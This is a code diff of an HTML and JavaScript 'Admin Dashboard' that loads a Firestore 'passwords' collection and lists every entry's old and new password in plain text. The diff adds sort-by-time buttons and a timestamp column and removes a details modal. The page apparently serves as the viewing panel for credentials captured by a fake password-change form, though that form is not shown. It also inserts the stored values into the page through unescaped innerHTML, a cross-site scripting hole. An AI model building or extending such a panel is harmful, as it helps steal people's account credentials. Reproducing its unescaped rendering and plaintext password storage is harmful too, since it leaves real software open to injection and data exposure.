@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Admin Dashboard</title>
   <style>
-    /* Base Styles */
+    /* Global Styles */
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       margin: 0;
@@ -14,53 +14,80 @@
       color: #333;
     }
 
-    /* Dashboard Layout */
     .container {
       width: 90%;
       max-width: 1200px;
       margin: 40px auto;
       background-color: #fff;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.15);
+      padding: 30px;
+      position: relative;
     }
 
     h1 {
-      font-size: 28px;
-      margin-bottom: 10px;
-      color: #333;
+      font-size: 32px;
+      margin-bottom: 20px;
       text-align: center;
+      color: #333;
     }
 
-    /* Table */
+    /* Sorting Dropdown */
+    .sorting-dropdown {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      font-size: 16px;
+      padding: 8px 12px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .sorting-dropdown:hover {
+      background-color: #0056b3;
+    }
+
+    /* Table Styles */
     .table-wrapper {
+      width: 100%;
       overflow-x: auto;
+      margin-top: 40px;
     }
 
     table {
       width: 100%;
       border-collapse: collapse;
-      margin-top: 20px;
+      font-size: 16px;
     }
+
     th, td {
-      padding: 14px 20px;
+      padding: 16px;
       text-align: left;
       border-bottom: 1px solid #ddd;
     }
+
     th {
-      background-color: #007BFF;
+      background-color: #007bff;
       color: white;
       font-weight: bold;
+      border-radius: 8px;
     }
+
     td {
       background-color: #f9f9f9;
-      border-left: 4px solid transparent;
     }
+
     tr:nth-child(even) {
       background-color: #f1f1f1;
     }
 
-    /* Button Styling */
+    .actions {
+      text-align: center;
+    }
+
     .btn {
       padding: 8px 16px;
       background-color: #28a745;
@@ -68,67 +95,16 @@
       border: none;
       border-radius: 6px;
       cursor: pointer;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
       transition: background-color 0.3s ease;
-      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
     }
+
     .btn:hover {
       background-color: #218838;
     }
+
     .btn:focus {
       outline: none;
-    }
-
-    /* Popup Modal Styling */
-    .modal {
-      display: none;
-      position: fixed;
-      z-index: 1000;
-      left: 0;
-      top: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.7);
-      justify-content: center;
-      align-items: center;
-      transition: opacity 0.3s ease;
-    }
-
-    .modal-content {
-      background-color: white;
-      padding: 30px;
-      border-radius: 8px;
-      width: 400px;
-      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.2);
-      transition: transform 0.3s ease;
-    }
-
-    .modal-header {
-      font-size: 24px;
-      color: #007BFF;
-      margin-bottom: 10px;
-    }
-
-    .modal-body {
-      font-size: 16px;
-      color: #555;
-    }
-
-    .modal-footer {
-      text-align: right;
-      margin-top: 20px;
-    }
-
-    .close {
-      padding: 8px 12px;
-      background-color: #dc3545;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-    .close:hover {
-      background-color: #c82333;
     }
 
     /* Responsive Design */
@@ -136,46 +112,38 @@
       .container {
         padding: 15px;
       }
+
       table {
         font-size: 14px;
       }
-    }
 
+      .sorting-dropdown {
+        font-size: 14px;
+        padding: 6px 10px;
+      }
+    }
   </style>
 </head>
 <body>
 
   <div class="container">
     <h1>Admin Dashboard</h1>
+    <button class="sorting-dropdown" onclick="sortData('recent')">Sort by Recently Added</button>
+    <button class="sorting-dropdown" onclick="sortData('oldest')">Sort by Oldest</button>
+
     <div class="table-wrapper">
       <table id="passwordTable">
         <thead>
           <tr>
             <th>Old Password</th>
             <th>New Password</th>
-            <th>Actions</th>
+            <th>Timestamp</th>
           </tr>
         </thead>
         <tbody>
           <!-- Data will be inserted here from Firebase -->
         </tbody>
       </table>
-    </div>
-  </div>
-
-  <!-- Modal for Viewing Password Details -->
-  <div id="passwordModal" class="modal">
-    <div class="modal-content">
-      <div class="modal-header">
-        <h2>Password Details</h2>
-      </div>
-      <div class="modal-body">
-        <p><strong>Old Password:</strong> <span id="modalOldPassword"></span></p>
-        <p><strong>New Password:</strong> <span id="modalNewPassword"></span></p>
-      </div>
-      <div class="modal-footer">
-        <button class="close" onclick="closeModal()">Close</button>
-      </div>
     </div>
   </div>
 
@@ -199,37 +167,57 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
+    let passwordData = [];
+
     // Function to load password data from Firebase Firestore
     async function loadPasswordData() {
       const querySnapshot = await getDocs(collection(db, "passwords"));
       const tableBody = document.querySelector("#passwordTable tbody");
-      
+
       querySnapshot.forEach((doc) => {
         const data = doc.data();
         const row = document.createElement("tr");
 
+        // Store timestamp and data
+        const timestamp = data.timestamp.toDate();
+
         row.innerHTML = `
           <td>${data.oldPassword}</td>
           <td>${data.newPassword}</td>
-          <td><button class="btn" onclick="viewDetails('${data.oldPassword}', '${data.newPassword}')">View</button></td>
+          <td>${timestamp.toLocaleString()}</td>
+        `;
+        
+        passwordData.push({ ...data, timestamp });
+        tableBody.appendChild(row);
+      });
+    }
+
+    // Function to sort the password data
+    function sortData(criteria) {
+      let sortedData = [];
+      
+      if (criteria === 'recent') {
+        sortedData = passwordData.sort((a, b) => b.timestamp - a.timestamp);
+      } else if (criteria === 'oldest') {
+        sortedData = passwordData.sort((a, b) => a.timestamp - b.timestamp);
+      }
+      
+      // Re-render sorted data
+      const tableBody = document.querySelector("#passwordTable tbody");
+      tableBody.innerHTML = '';
+
+      sortedData.forEach((data) => {
+        const row = document.createElement("tr");
+        row.innerHTML = `
+          <td>${data.oldPassword}</td>
+          <td>${data.newPassword}</td>
+          <td>${data.timestamp.toLocaleString()}</td>
         `;
         tableBody.appendChild(row);
       });
     }
 
-    // Function to view password details in the modal
-    function viewDetails(oldPassword, newPassword) {
-      document.getElementById('modalOldPassword').textContent = oldPassword;
-      document.getElementById('modalNewPassword').textContent = newPassword;
-      document.getElementById('passwordModal').style.display = 'flex';
-    }
-
-    // Function to close the modal
-    function closeModal() {
-      document.getElementById('passwordModal').style.display = 'none';
-    }
-
-    // Load the data when the page is ready
+    // Load data when the page is ready
     window.onload = loadPasswordData;
   </script>
 </body>
